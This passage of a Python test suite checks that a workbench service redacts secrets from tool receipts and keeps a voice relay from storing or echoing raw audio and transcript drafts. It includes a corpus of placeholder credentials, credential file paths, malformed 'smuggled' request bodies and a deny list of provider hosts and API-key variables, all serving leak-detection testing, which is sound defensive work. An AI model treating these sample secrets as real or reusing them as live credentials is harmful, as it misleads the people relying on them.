        raise RuntimeError(_ptd_leaky_text())

    result = service.dispatch(_rtpsec_read_request(), boom)
    assert result.receipt["status"] == "failed"
    text = _rtpsec_json.dumps(_ptd_scrub({"receipt": result.receipt}))
    for secret in _PTD_CORPUS:
        assert secret not in text, f"leak survived in read failure receipt: {secret}"


def test_rtp_t005_receipt_external_ref_leak_collapses_to_a_redacted_token():
    # A tool that returns a leaky external_ref value: the receipt collapses it to
    # a fixed redacted token rather than persisting the path/secret verbatim.
    service = _rtpsec_service()
    out = service.dispatch(_rtpsec_read_request(), lambda d, i: _RtpSecOutcome(
        "succeeded", external_ref={"path": "/etc/anvil/secrets.env"}))
    assert out.receipt["status"] == "succeeded"
    text = _rtpsec_json.dumps(_ptd_scrub({"receipt": out.receipt}))
    assert "/etc/anvil/secrets.env" not in text


def test_rtp_t004_served_tool_projection_reports_credentials_by_reference_only():
    service = _rtpsec_service()
    served = _ptd_scrub({"tools": service.list_tools()})
    text = _rtpsec_json.dumps(served)
    # deploy-notifier declares a host-owned credential: it is present by reference
    # (owner host + ref id) and carries no value/secret field.
    assert "deploy-channel-ref" in text
    assert '"value"' not in text and '"secret"' not in text
    for secret in _PTD_CORPUS:
        assert secret not in text


# --- chat-first-voice T005.4: the voice relay leaks NO audio or draft ---------
#
# THE criterion for the voice slice: raw input audio, synthesized output audio,
# and any unsubmitted transcript draft must NEVER reach the durable store, logs,
# audit records, the graph projection, or an error payload. These tests prove it
# through the SAME wired entrypoint (create_app) and the SAME persisted lifecycle
# log the runtime uses -- never a hand-built object.

import base64 as _vs_base64

from workbench.voice import (
    MemoryVoiceEventLog as _VsEventLog,
    ServingVoiceTransport as _VsServingTransport,
    VoiceRelayService as _VsService,
    VoiceServingError as _VsServing,
)

#: A distinctive raw-audio marker and a distinctive transcript-draft marker. If
#: either ever appears in a persisted, served, or error surface, the relay leaked.
_VOICE_AUDIO_MARKER = b"RAW-AUDIO-SECRET-WAVEFORM-BYTES"
_VOICE_DRAFT_MARKER = "unsubmitted private dictation draft text"

#: The standard free-text leak corpus (three-lens finding 1): every one of these
#: must be scrubbed / absent from any voice error prose the browser can see.
_VOICE_LEAK_CORPUS = {
    "akia": "AKIAIOSFODNN7EXAMPLE",
    "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.sig",
    "pem": "-----BEGIN RSA PRIVATE KEY-----MIIabc-----END RSA PRIVATE KEY-----",
    "dburl": "postgresql://user:pw@db.internal:5432/state",
    "dotlesshost": "serving:8443",
    "etcpath": "/etc/anvil/serving.token",
    "winpath": "C:\\Users\\op\\serving.key",
    "ip": "100.64.0.5:7687",
}


class _MarkerVoiceTransport:
    """A stub Serving transport that echoes distinctive markers back.

    The transcript it returns carries the DRAFT marker; the audio it synthesizes
    carries the AUDIO marker. A correct relay stores neither.
    """

    def transcribe(self, request):
        return {"text": _VOICE_DRAFT_MARKER, "is_final": True, "duration_ms": 1000}

    def synthesize(self, request):
        return {"audio_b64": _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode("ascii"), "format": "mp3", "sample_rate": 24000}


def _marker_service(event_log):
    return _VsService(
        _MarkerVoiceTransport(), voice_authorized=frozenset({"alice"}),
        scope_authorized=lambda a, c: True, event_log=event_log,
    )


def test_voice_lifecycle_log_persists_no_audio_or_transcript_draft():
    # The event log is the ONLY durable voice sink. After a full STT+TTS cycle it
    # must carry lifecycle state + correlation + counts, and NONE of the input
    # audio, synthesized audio, or the transcript draft text.
    log = _VsEventLog()
    service = _marker_service(log)
    service.transcribe(
        actor="alice", conversation_id="conv_leak", correlation_id="corr_a",
        audio=_VOICE_AUDIO_MARKER, audio_format="pcm16", is_final=True, duration_ms=1000,
    )
    service.synthesize(
        actor="alice", conversation_id="conv_leak", correlation_id="corr_b",
        message_ref="turn_1", text="please read this back", output_format="mp3",
    )
    events = log.events("conv_leak")
    assert len(events) == 2
    blob = json.dumps([e.as_event_data() for e in events])
    # No transcript draft text, no raw audio, no base64 of either.
    assert _VOICE_DRAFT_MARKER not in blob
    assert _VOICE_AUDIO_MARKER.decode("latin-1") not in blob
    assert _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode() not in blob
    assert "data:audio" not in blob and "audio" not in blob
    # But the useful content-free metadata IS present, so the scrub is real (not
    # the events silently vanishing).
    assert any(e.transcript_chars is not None for e in events)
    assert any(e.byte_count is not None for e in events)


def _voice_sec_client(service, conversation_store=None):
    from fastapi.testclient import TestClient

    from workbench.api import create_app
    from workbench.config import Settings

    settings = Settings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="alice", approvers=frozenset({"alice"}), bridge_bootstrap_token="",
        anvil_router_base_url="http://serving", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
        chat_content_hash_key="voice-sec-test-content-hash-key",
    )
    return TestClient(create_app(
        settings=settings, store=MemoryStore(), graph=NullGraph(),
        conversation_store=conversation_store, voice_relay_service=service,
    ))


def test_voice_transcribe_served_response_never_echoes_the_input_audio():
    # The STT response returns only the editable DRAFT; the raw input audio the
    # browser posted is never echoed back in any field.
    service = _marker_service(_VsEventLog())
    client = _voice_sec_client(service)
    audio_b64 = _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode()
    r = client.post("/api/chat/voice/transcribe", json={
        "conversation_id": "c", "audio_base64": audio_b64, "audio_format": "pcm16", "is_final": True,
    }, headers={"X-Workbench-Actor": "alice"})
    assert r.status_code == 200
    body = r.text
    assert audio_b64 not in body
    assert _VOICE_AUDIO_MARKER.decode("latin-1") not in body
    # The response is exactly the draft envelope -- no audio field of any name.
    assert set(r.json().keys()) == {"draft"}
    assert set(r.json()["draft"].keys()) == {"text", "is_final", "duration_ms"}


def test_voice_error_payload_carries_no_audio_and_no_leak_corpus():
    # A Serving failure whose upstream detail is stuffed with the full leak corpus
    # AND raw audio must surface to the browser as a FIXED, non-leaking detail.
    from workbench.router import RouterError

    corpus_text = "install failed: " + " ".join(_VOICE_LEAK_CORPUS.values()) + " " + _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode()

    class _LeakyTransport:
        def transcribe(self, request):
            raise RouterError(corpus_text)

        def synthesize(self, request):
            raise RouterError(corpus_text)

    # Wrap the leaky transport in the production ServingVoiceTransport shim by
    # monkeypatching the router functions it calls, so the WIRED failure path is
    # exercised rather than a hand-built error.
    import workbench.router as _router_mod
    real_t, real_s = _router_mod.voice_transcribe, _router_mod.voice_synthesize

    def boom(*a, **k):
        raise RouterError(corpus_text)

    _router_mod.voice_transcribe = boom
    _router_mod.voice_synthesize = boom
    try:
        transport = _VsServingTransport("http://serving", "tok", "stt", "tts")
        service = _VsService(transport, voice_authorized=frozenset({"alice"}), scope_authorized=lambda a, c: True)
        client = _voice_sec_client(service)
        r = client.post("/api/chat/voice/transcribe", json={
            "conversation_id": "c", "audio_base64": _vs_base64.b64encode(b"x").decode(),
            "audio_format": "pcm16", "is_final": True,
        }, headers={"X-Workbench-Actor": "alice"})
    finally:
        _router_mod.voice_transcribe = real_t
        _router_mod.voice_synthesize = real_s

    assert r.status_code == 502
    body = r.text
    # The fixed detail leaks none of the corpus and no audio.
    for name, literal in _VOICE_LEAK_CORPUS.items():
        assert literal not in body, f"voice error leaked corpus item {name!r}: {literal!r}"
    assert _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode() not in body
    assert r.json()["detail"] == "voice relay is unavailable"


def test_voice_pre_endpoint_validation_422_never_reflects_raw_audio_or_text():
    # MUST-1: FastAPI's default RequestValidationError fires BEFORE the endpoint
    # and echoes the offending ``input`` verbatim. For the voice lane that ``input``
    # IS the raw base64 audio (oversized / wrong-type) or the raw TTS text
    # (over-length), which a 4xx-body-logging tailnet proxy would then persist --
    # exactly the forbidden sink this slice excludes. Every malformed shape must
    # instead return the FIXED, ``input``-free detail, while NON-voice endpoints
    # keep their default 422 (which reflects normally).
    service = _marker_service(_VsEventLog())
    client = _voice_sec_client(service)
    headers = {"X-Workbench-Actor": "alice"}

    # (a) An OVERSIZED audio_base64 (breaches the field max_length) carrying a
    #     distinctive marker.
    audio_marker = "OVERSIZED_AUDIO_LEAK_MARKER"
    oversized = audio_marker + "A" * 11_000_000
    ra = client.post("/api/chat/voice/transcribe", json={
        "conversation_id": "c", "audio_base64": oversized, "audio_format": "pcm16", "is_final": True,
    }, headers=headers)
    assert ra.status_code == 422
    assert audio_marker not in ra.text
    assert ra.json() == {"detail": "voice request is invalid"}

    # (b) A WRONG-TYPE audio_base64 (a nested object, not a string) carrying a
    #     distinctive marker -- the default handler would echo the whole object.
    wrongtype_marker = "WRONGTYPE_AUDIO_LEAK_MARKER"
    rb = client.post("/api/chat/voice/transcribe", json={
        "conversation_id": "c", "audio_base64": {"smuggled": wrongtype_marker}, "audio_format": "pcm16", "is_final": True,
    }, headers=headers)
    assert rb.status_code == 422
    assert wrongtype_marker not in rb.text
    assert rb.json() == {"detail": "voice request is invalid"}

    # (c) An OVER-LENGTH TTS text carrying a distinctive marker.
    text_marker = "OVERLENGTH_TTS_LEAK_MARKER"
    rc = client.post("/api/chat/voice/speak", json={
        "conversation_id": "c", "message_ref": "m", "text": text_marker + "x" * 21_000, "output_format": "mp3",
    }, headers=headers)
    assert rc.status_code == 422
    assert text_marker not in rc.text
    assert rc.json() == {"detail": "voice request is invalid"}

    # A NON-voice endpoint's 422 is UNCHANGED: it still reflects the offending
    # input in the default errors list (proving the scrub is voice-scoped, not a
    # global change). Revert-detection: without the handler, (a)-(c) leak.
    nonvoice_marker = "NONVOICE_REFLECTED_MARKER"
    rn = client.post("/api/policy-operations/preview", json={"smuggled": nonvoice_marker}, headers=headers)
    assert rn.status_code == 422
    assert nonvoice_marker in rn.text  # non-voice still echoes input normally
    assert isinstance(rn.json()["detail"], list)


def test_voice_full_cycle_leaves_no_audio_or_draft_marker_in_the_wired_store_or_audit():
    # Optional durable-surface proof: run a full STT+TTS cycle through the WIRED
    # app and assert neither the store's audit/events nor the lifecycle log carry
    # any audio/draft marker. The event log is the only durable voice sink; the
    # store must stay entirely marker-free (voice writes nothing to it).
    store = MemoryStore()
    log = _VsEventLog()
    service = _marker_service(log)
    from fastapi.testclient import TestClient

    from workbench.api import create_app
    from workbench.config import Settings

    settings = Settings(
        database_url="unused", neo4j_uri="unused", neo4j_user="neo4j", neo4j_password="",
        owner="alice", approvers=frozenset({"alice"}), bridge_bootstrap_token="",
        anvil_router_base_url="http://serving", anvil_router_token="",
        identity_header="X-Workbench-Actor", allow_insecure_dev_actor=True,
        chat_content_hash_key="voice-sec-test-content-hash-key",
    )
    client = TestClient(create_app(
        settings=settings, store=store, graph=NullGraph(), voice_relay_service=service,
    ))
    headers = {"X-Workbench-Actor": "alice"}
    rt = client.post("/api/chat/voice/transcribe", json={
        "conversation_id": "conv_cycle", "audio_base64": _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode(),
        "audio_format": "pcm16", "is_final": True,
    }, headers=headers)
    assert rt.status_code == 200
    rs = client.post("/api/chat/voice/speak", json={
        "conversation_id": "conv_cycle", "message_ref": "m1", "text": "please read this", "output_format": "mp3",
    }, headers=headers)
    assert rs.status_code == 200

    # The wired store never saw any voice write at all: dump every audit row and
    # assert both markers (and the audio base64) are absent.
    store_blob = "".join(repr(record) for record in store.list_audit(limit=1000))
    assert _VOICE_DRAFT_MARKER not in store_blob
    assert _VOICE_AUDIO_MARKER.decode("latin-1") not in store_blob
    assert _vs_base64.b64encode(_VOICE_AUDIO_MARKER).decode() not in store_blob
    # And the only durable voice sink (the lifecycle log) is likewise clean.
    log_blob = json.dumps([e.as_event_data() for e in log.events("conv_cycle")])
    assert _VOICE_DRAFT_MARKER not in log_blob and _VOICE_AUDIO_MARKER.decode("latin-1") not in log_blob


def test_voice_relay_sources_reach_no_raw_provider():
    # AGENTS.md boundary: STT/TTS relay only through Anvil Serving. The voice
    # relay and its Serving audio functions must never name a raw provider host or
    # a raw-provider API key env var.
    forbidden = ("api.anthropic.com", "ANTHROPIC_API_KEY", "openai.com", "OPENAI_API_KEY")
    voice_src = (_REPO_ROOT / "workbench" / "voice.py").read_text(encoding="utf-8")
    router_src = (_REPO_ROOT / "workbench" / "router.py").read_text(encoding="utf-8")
    for token in forbidden:
        assert token not in voice_src, f"voice.py references a raw provider: {token}"
        assert token not in router_src, f"router.py references a raw provider: {token}"
